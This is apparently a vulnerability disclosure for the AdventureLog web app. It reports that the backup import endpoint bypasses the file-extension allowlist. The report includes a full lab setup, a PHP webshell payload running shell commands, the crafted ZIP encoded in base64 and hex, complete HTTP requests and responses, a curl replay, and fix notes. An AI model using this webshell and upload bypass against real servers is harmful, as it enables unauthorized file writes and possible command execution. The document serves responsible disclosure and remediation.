### Vulnerability details

**Official website / Product:** https://adventurelog.app / https://github.com/seanmorley15/AdventureLog

**Repository:** seanmorley15/AdventureLog (stars at selection: 3848)

**Vulnerability type:** file_upload (CWE-434 — unrestricted upload via backup import bypassing extension allowlist)

**Vulnerability versions:** current `main` @ `ece0be22b1e74cdd627edfe28677007609949ae5` / Docker image `ghcr.io/seanmorley15/adventurelog:latest`

**Vulnerability URL / Parameter:** `POST /api/backup/import` multipart field `file` (ZIP). Same class of sink also exists at `POST /api/collections/import`.

**Complex:** yes

### Verification procedure

1. Deploy with the official repo `docker-compose.yml` (`ghcr.io/seanmorley15/adventurelog:latest` + `postgis/postgis:16-3.5`). Reconstructable lab (host **19602→80**):

```bash
mkdir -p /tmp/adventurelog-lab && cd /tmp/adventurelog-lab
cat > .env <<'EOF'
HOST_PORT=19602
SITE_URL=http://127.0.0.1:19602
POSTGRES_PASSWORD=AdventureLogLabPass1
SKIP_WORLD_DATA=1
EOF
cat > docker-compose.yml <<'EOF'
services:
  app:
    image: ghcr.io/seanmorley15/adventurelog:latest
    container_name: adventurelog
    restart: unless-stopped
    env_file: .env
    environment:
      SITE_URL: ${SITE_URL:-http://localhost:8015}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?Set POSTGRES_PASSWORD in .env or your environment}
      PGHOST: db
      POSTGRES_DB: database
      POSTGRES_USER: adventure
      PORT: "3000"
      SKIP_WORLD_DATA: ${SKIP_WORLD_DATA:-0}
    ports:
      - "${HOST_PORT:-8015}:80"
    volumes:
      - adventurelog_media:/code/media/
    depends_on:
      db:
        condition: service_healthy
    healthcheck:
      test:
        [
          "CMD-SHELL",
          "python3 -c \"import urllib.request; urllib.request.urlopen('http://127.0.0.1:80/health')\""
        ]
      interval: 30s
      timeout: 5s
      retries: 5
      start_period: 120s

  db:
    image: postgis/postgis:16-3.5
    container_name: adventurelog-db
    restart: unless-stopped
    environment:
      POSTGRES_DB: database
      POSTGRES_USER: adventure
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?Set POSTGRES_PASSWORD in .env or your environment}
    volumes:
      - postgres_data:/var/lib/postgresql/data/
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U adventure -d database"]
      interval: 5s
      timeout: 5s
      retries: 5
      start_period: 10s

volumes:
  postgres_data:
  adventurelog_media:
EOF
docker compose up -d
```

2. Open http://127.0.0.1:19602/ . Default admin is `admin` / `admin`; or register a normal user (PoC username `auditor1`, email `auditor1@example.com`; set your own password).
3. Create an API key under **Settings → Security** (`/settings?tab=security`) and send `X-API-Key: al_...`. Example key used in the packets below: `al_RRF3KTqN2_-CaP0qLrM7nQY5zralomIR4FKKokb68w4` (must recreate and substitute after redeploy).
4. Contrast — hardened path: create any location UUID (UI or `POST /api/locations/`), then `POST /api/attachments` with `shell.php` → **400** `Unsupported file extension.`
5. Build a backup ZIP:
   - `data.json` references a location whose `attachments` entry has `filename: getshell.php`
   - ZIP member `attachments/getshell.php` body: `<?php echo "R16A2_GETSHELL"; system($_GET["c"]); ?>`
   - The base64-decoded byte-identical ZIP below is 603 bytes, SHA-256 `8af5895a6bd4026af05ab866c124f63cb4fd11deddc9d31f89b589580d61763f`; rebuilding with `zip` also works (timestamps/directory entries may change the hash; functionally equivalent)
6. `POST /api/backup/import` with multipart `confirm=yes` and that ZIP.
7. Observe HTTP 200 with `summary.attachments: 1`, file created under `/code/media/attachments/<uuid>.php`, and `GET /media/attachments/<uuid>.php` returns the raw webshell bytes.

ZIP rebuild:

```bash
mkdir -p /tmp/al-poc/attachments
cat > /tmp/al-poc/data.json <<'EOF'
{"version": "0.11.0", "export_date": "2026-11-01T00:00:00", "user_email": "auditor1@example.com", "user_username": "auditor1", "categories": [], "collections": [], "locations": [{"export_id": "L1", "name": "Shell Loc", "description": "poc", "is_public": false, "price": null, "price_currency": null, "city": null, "region": null, "country": null, "category": null, "tags": [], "rating": null, "link": null, "latitude": null, "longitude": null, "attachments": [{"filename": "getshell.php", "name": "getshell"}], "images": [], "visits": [], "trails": [], "activities": []}], "transportation": [], "notes": [], "checklists": [], "lodging": [], "visited_cities": [], "visited_regions": []}
EOF
printf '%s' '<?php echo "R16A2_GETSHELL"; system($_GET["c"]); ?>' > /tmp/al-poc/attachments/getshell.php
(cd /tmp/al-poc && zip -q -r backup.zip data.json attachments)
```

Or decode the byte-identical ZIP directly (603 bytes, SHA-256 `8af5895a6bd4026af05ab866c124f63cb4fd11deddc9d31f89b589580d61763f`):

```bash
mkdir -p /tmp/al-poc
base64 -d > /tmp/al-poc/backup.zip <<'EOF'
UEsDBBQAAAAIAAhlYV21G/daOAEAAK0CAAAJAAAAZGF0YS5qc29uXVHLasMwEPyV4HNj7Bx6yKkfkFt7K8Go0kZespaEtAopIf9eKbZsUTCCnRnvY+bR3MAHtKY57pqu7fu2a952Ddyd9TwowZCJQ3d43/f9vuu/uu74+rIqBvADTAIpi0RUyNb3H3AXkyNopZ1WVX6MmKAWZlKmCdp6hJCY73NGLBFITiutENkkK8CjLIcqNzu92pTWnyMQ7U5WZlBBkB4dL9e5GcUwuPhDKBN2ERQgYc6jzP+bSFTKQUbvwcjfDZfIVeVBz50La6NhX8vn2yqEhV6P8ukkozeO0FyrKrEcVbUUWaP/QYJZyHECw4szFyQoVmjgkN1o3ehqiwrePPMWOAm9eX/DgLxW7FOyayVSJjfkktRzUZiQwxCLyS+lsVzFOYK8Egau0lR6vnybCWqQW+8KnU1eRv4BUEsDBBQAAAAIAAhlYV1i7deYMwAAADMAAAAYAAAAYXR0YWNobWVudHMvZ2V0c2hlbGwucGhws7EvyChQSE3OyFdQCjI0czSKd3cNCfZw9fFRslYoriwuSc3VUAGJRSslK8VqWivY2wEAUEsBAhQDFAAAAAgACGVhXbUb91o4AQAArQIAAAkAAAAAAAAAAAAAAIABAAAAAGRhdGEuanNvblBLAQIUAxQAAAAIAAhlYV1i7deYMwAAADMAAAAYAAAAAAAAAAAAAACAAV8BAABhdHRhY2htZW50cy9nZXRzaGVsbC5waHBQSwUGAAAAAAIAAgB9AAAAyAEAAAAA
EOF
```

### Complete vulnerability PoC

Contrast — direct attachment upload blocked by `validate_file_extension` (full request + raw Docker response):

```http
POST /api/attachments HTTP/1.1
Host: 127.0.0.1:19602
User-Agent: curl/8.22.0
Accept: */*
X-API-Key: al_RRF3KTqN2_-CaP0qLrM7nQY5zralomIR4FKKokb68w4
Origin: http://127.0.0.1:19602
Referer: http://127.0.0.1:19602/
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrejectpoc
Content-Length: 429

------WebKitFormBoundaryrejectpoc
Content-Disposition: form-data; name="content_type"

location
------WebKitFormBoundaryrejectpoc
Content-Disposition: form-data; name="object_id"

0656ce1e-1286-4491-936d-dc5e349b1ec3
------WebKitFormBoundaryrejectpoc
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET["c"]); ?>
------WebKitFormBoundaryrejectpoc--
```

```http
HTTP/1.1 400
Server: nginx/1.26.3
Date: Sun, 01 Nov 2026 17:40:16 GMT
Content-Type: application/json
Content-Length: 40
Connection: keep-alive
access-control-allow-credentials: true
access-control-allow-origin: http://127.0.0.1:19602
allow: GET, POST, HEAD, OPTIONS
set-cookie: csrftoken=; Max-Age=0; Path=/; HttpOnly; Secure; SameSite=Lax
vary: Cookie, origin
x-frame-options: DENY

{"file":["Unsupported file extension."]}
```

Exploit — complete HTTP request as sent on the wire. Below is the **complete** request with the ZIP file part encoded as hex (Content-Transfer-Encoding: hex) so the markdown stays text-safe while preserving every byte; decoding the hex regenerates the identical ZIP that was uploaded (member `attachments/getshell.php` = `<?php echo "R16A2_GETSHELL"; system($_GET["c"]); ?>`). Prefer replaying with the rebuilt `/tmp/al-poc/backup.zip` via the curl below.

```http
POST /api/backup/import HTTP/1.1
Host: 127.0.0.1:19602
User-Agent: curl/8.22.0
Accept: */*
X-API-Key: al_RRF3KTqN2_-CaP0qLrM7nQY5zralomIR4FKKokb68w4
Origin: http://127.0.0.1:19602
Referer: http://127.0.0.1:19602/settings
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr16a2poc
Content-Length: 865

------WebKitFormBoundaryr16a2poc
Content-Disposition: form-data; name="confirm"

yes
------WebKitFormBoundaryr16a2poc
Content-Disposition: form-data; name="file"; filename="backup.zip"
Content-Type: application/zip
Content-Transfer-Encoding: hex

504b03041400000008000865615db51bf75a38010000ad02000009000000646174612e6a736f
6e5d51cb6ac33010fc95e07363ec1c7ac8a91f905b7b2bc1a8d2465eb29684b40a2921ff5e29
b66c5130829d19ef63e6d1dcc007b4a639ee9aaeedfbb66bde760ddc9df53c28c19089437778
dff7fdbeebbfbaeef8fab22a06f0034c02298b4454c8d6f71f7017932368a59d56557e8c98a0
166652a609da7a849098ef73462c11484e2bad10d9242bc0a32c872a373bbdda94d69f2310ed
4e56665041901e1d2fd7b919c530b8f84328137611142061cea3ccff9b4854ca4146efc1c8df
0d97c855e541cf9d0b6ba3615fcbe7db2a84855e8ff2e924a3378ed05cab2ab11c55b51459a3
ff418259c87102c38b331724285668e090dd68dde86a8b0ade3cf3163809bd797fc380bc56ec
53b26b25522637e492d473519890c3108bc92fa5b15cc53982bc1206aed2547abe7c9b096a90
5bef0a9d4d5e46fe01504b03041400000008000865615d62edd7983300000033000000180000
006174746163686d656e74732f6765747368656c6c2e706870b3b12fc82850484dcec857500a
323473348a77770d09f670f5f151b25628ae2c2e49cdd5500189452b252bc56a5a2bd8db0100
504b010214031400000008000865615db51bf75a38010000ad02000009000000000000000000
0000800100000000646174612e6a736f6e504b010214031400000008000865615d62edd79833
0000003300000018000000000000000000000080015f0100006174746163686d656e74732f67
65747368656c6c2e706870504b050600000000020002007d000000c80100000000
------WebKitFormBoundaryr16a2poc--

```

Complete raw request also provided as base64 of the exact wire bytes (decode to reproduce the binary multipart that was accepted):

```
UE9TVCAvYXBpL2JhY2t1cC9pbXBvcnQgSFRUUC8xLjENCkhvc3Q6IDEyNy4wLjAuMToxOTYwMg0K
VXNlci1BZ2VudDogY3VybC84LjIyLjANCkFjY2VwdDogKi8qDQpYLUFQSS1LZXk6IGFsX1JSRjNL
VHFOMl8tQ2FQMHFMck03blFZNXpyYWxvbUlSNEZLS29rYjY4dzQNCk9yaWdpbjogaHR0cDovLzEy
Ny4wLjAuMToxOTYwMg0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxOTYwMi9zZXR0aW5ncw0K
Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9y
bUJvdW5kYXJ5cjE2YTJwb2MNCkNvbnRlbnQtTGVuZ3RoOiA4NjUNCg0KLS0tLS0tV2ViS2l0Rm9y
bUJvdW5kYXJ5cjE2YTJwb2MNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0i
Y29uZmlybSINCg0KeWVzDQotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlyMTZhMnBvYw0KQ29udGVu
dC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImJhY2t1cC56
aXAiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3ppcA0KDQpQSwMEFAAAAAgACGVhXbUb91o4
AQAArQIAAAkAAABkYXRhLmpzb25dUctqwzAQ/JXgc2PsHHrIqR+QW3srwajSRl6yloS0Cikh/14p
tmxRMIKdGe9j5tHcwAe0pjnumq7t+7Zr3nYN3J31PCjBkIlDd3jf9/2+67+67vj6sioG8ANMAimL
RFTI1vcfcBeTI2ilnVZVfoyYoBZmUqYJ2nqEkJjvc0YsEUhOK60Q2SQrwKMshyo3O73alNafIxDt
TlZmUEGQHh0v17kZxTC4+EMoE3YRFCBhzqPM/5tIVMpBRu/ByN8Nl8hV5UHPnQtro2Ffy+fbKoSF
Xo/y6SSjN47QXKsqsRxVtRRZo/9BglnIcQLDizMXJChWaOCQ3Wjd6GqLCt488xY4Cb15f8OAvFbs
U7JrJVImN+SS1HNRmJDDEIvJL6WxXMU5grwSBq7SVHq+fJsJapBb7wqdTV5G/gFQSwMEFAAAAAgA
CGVhXWLt15gzAAAAMwAAABgAAABhdHRhY2htZW50cy9nZXRzaGVsbC5waHCzsS/IKFBITc7IV1AK
MjRzNIp3dw0J9nD18VGyViiuLC5JzdVQAYlFKyUrxWpaK9jbAQBQSwECFAMUAAAACAAIZWFdtRv3
WjgBAACtAgAACQAAAAAAAAAAAAAAgAEAAAAAZGF0YS5qc29uUEsBAhQDFAAAAAgACGVhXWLt15gz
AAAAMwAAABgAAAAAAAAAAAAAAIABXwEAAGF0dGFjaG1lbnRzL2dldHNoZWxsLnBocFBLBQYAAAAA
AgACAH0AAADIAQAAAAANCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeXIxNmEycG9jLS0NCg==
```

Simplified curl replay (preferred; uses the rebuilt ZIP above):

```bash
curl -sS -D- http://127.0.0.1:19602/api/backup/import \
  -H "X-API-Key: al_RRF3KTqN2_-CaP0qLrM7nQY5zralomIR4FKKokb68w4" \
  -F 'confirm=yes' \
  -F "file=@/tmp/al-poc/backup.zip;type=application/zip"
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Server: nginx/1.26.3
Date: Sun, 01 Nov 2026 17:40:16 GMT
Content-Type: application/json
Content-Length: 333
Connection: keep-alive
access-control-allow-credentials: true
access-control-allow-origin: http://127.0.0.1:19602
allow: POST, OPTIONS
set-cookie: csrftoken=; Max-Age=0; Path=/; HttpOnly; Secure; SameSite=Lax
vary: Cookie, origin
x-frame-options: DENY

{"success":true,"message":"Data imported successfully","summary":{"categories":0,"collections":0,"locations":1,"transportation":0,"notes":0,"checklists":0,"checklist_items":0,"lodging":0,"images":0,"attachments":1,"visited_cities":0,"visited_regions":0,"trails":0,"trails_skipped":0,"activities":0,"gpx_files":0,"itinerary_items":0}}
```

Impact — fetch stored `.php` attachment (raw payload; default nginx does **not** execute PHP):

```http
GET /media/attachments/d8a5ac1c-13f2-4a8d-89b4-8c997036cfb6.php HTTP/1.1
Host: 127.0.0.1:19602
User-Agent: curl/8.22.0
Accept: */*
X-API-Key: al_RRF3KTqN2_-CaP0qLrM7nQY5zralomIR4FKKokb68w4

```

```http
HTTP/1.1 200 OK
Server: nginx/1.26.3
Date: Sun, 01 Nov 2026 17:40:16 GMT
Content-Type: application/octet-stream
Content-Length: 51
Last-Modified: Sun, 01 Nov 2026 17:40:16 GMT
Connection: keep-alive
ETag: "6ae77980-33"
Content-Security-Policy: default-src 'self'; script-src 'none'; object-src 'none'; base-uri 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Accept-Ranges: bytes

<?php echo "R16A2_GETSHELL"; system($_GET["c"]); ?>
```

On-disk proof inside the container (run after a successful import):

```bash
docker exec adventurelog sh -c 'ls -l /code/media/attachments/*.php; f=$(ls /code/media/attachments/*.php | head -1); echo FILE=$f; xxd "$f"; cat "$f"'
```

Expected output (uuid differs per import; body and length are fixed):

```
-rw-r--r-- 1 root root 51 Nov  1 17:40 /code/media/attachments/d8a5ac1c-13f2-4a8d-89b4-8c997036cfb6.php

FILE=/code/media/attachments/d8a5ac1c-13f2-4a8d-89b4-8c997036cfb6.php
 3c 3f 70 68 70 20 65 63 68 6f 20 22 52 31 36 41
 32 5f 47 45 54 53 48 45 4c 4c 22 3b 20 73 79 73
 74 65 6d 28 24 5f 47 45 54 5b 22 63 22 5d 29 3b
 20 3f 3e

<?php echo "R16A2_GETSHELL"; system($_GET["c"]); ?>
```

Verification result notes:

- Direct REST upload of `shell.php` is rejected (`Unsupported file extension.`). Full contrast request/response are above.
- Backup import accepts the same class of content, stores `/code/media/attachments/<uuid>.php` (one lab run produced `d8a5ac1c-13f2-4a8d-89b4-8c997036cfb6.php`) with body `<?php echo "R16A2_GETSHELL"; system($_GET["c"]); ?>`.
- Authorized media download returns that exact payload as `application/octet-stream` (full GET request/response above).
- Default AIO nginx serves media via internal `X-Accel-Redirect` with `script-src 'none'` / `nosniff` and **no PHP handler**, so this is unrestricted file write/upload (CWE-434), not automatic RCE on stock images. Any later addition of a script engine on `/media` or a file-processing gadget would turn stored `.php`/other types into getshell.

### Vulnerability analysis

AdventureLog attaches `validate_file_extension` to `ContentAttachment.file` and enforces it on the DRF attachment create path (serializer / field validators). However:

1. Django does **not** run field validators on `Model.save()` / `QuerySet.create()` unless `full_clean()` is invoked.
2. `ContentAttachment` has **no** `save()` override calling `full_clean()` (unlike `ContentImage` / `Activity`).
3. Backup import `_import_attachments` and collection ZIP import construct `ContentFile(..., name=filename)` then `ContentAttachment.objects.create(...)` / `.save()`, skipping the allowlist.
4. `PathAndRename` keeps the attacker-controlled final extension (`uuid.php`), so disallowed types such as `.php` / `.html` / `.svg` persist under `media/attachments/`.

Trigger / sink source (full path and line numbers at commit `ece0be22b1e74cdd627edfe28677007609949ae5`):

```python
# File: backend/server/adventures/models.py
# Lines: 65-71
def validate_file_extension(value):
    import os
    from django.core.exceptions import ValidationError
    ext = os.path.splitext(value.name)[1]
    valid_extensions = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.png', '.jpg', '.jpeg', '.gif', '.webp', '.mp4', '.mov', '.avi', '.mkv', '.mp3', '.wav', '.flac', '.ogg', '.m4a', '.wma', '.aac', '.opus', '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.zst', '.lz4', '.lzma', '.lzo', '.z', '.tar.gz', '.tar.bz2', '.tar.xz', '.tar.zst', '.tar.lz4', '.tar.lzma', '.tar.lzo', '.tar.z', '.gpx', '.md']
    if not ext.lower() in valid_extensions:
        raise ValidationError('Unsupported file extension.')
```

```python
# File: backend/server/adventures/models.py
# Lines: 522-544 (no full_clean in save)
class ContentAttachment(models.Model):
    file = models.FileField(upload_to=PathAndRename('attachments/'), validators=[validate_file_extension])
    # ... fields omitted for brevity in comment only; see repo ...
    def delete(self, *args, **kwargs):
        if self.file:
            self.file.delete(save=False)
        super().delete(*args, **kwargs)
```

```python
# File: backend/server/adventures/views/import_export_view.py
# Lines: 287-306
def _import_attachments(self, attachments_data, zip_file, user, content_type, object_id, summary):
    for att_data in attachments_data or []:
        filename = (att_data or {}).get('filename')
        if not filename:
            continue
        try:
            att_content = zip_file.read(f'attachments/{filename}')
        except KeyError:
            continue
        att_file = ContentFile(att_content, name=filename)
        ContentAttachment.objects.create(
            user=user,
            file=att_file,
            name=(att_data or {}).get('name'),
            content_type=content_type,
            object_id=object_id,
        )
```

Secondary sink (same bug class):

```python
# File: backend/server/adventures/views/collection_view.py
# Lines: 924-930
attachment_obj = ContentAttachment(
    user=request.user,
    file=ContentFile(file_bytes_att, name=file_name_att),
)
attachment_obj.content_object = loc
attachment_obj.save()
```

### Fix notes

- Call `full_clean()` before saving `ContentAttachment` (or validate extension explicitly in import helpers).
- Prefer ignoring client-supplied filenames and deriving a safe extension from an allowlisted sniff.
- Reject ZIP members whose basename extension is not in `valid_extensions` before `ContentFile` creation.
- Apply the same checks to collection import and any future bulk import paths.
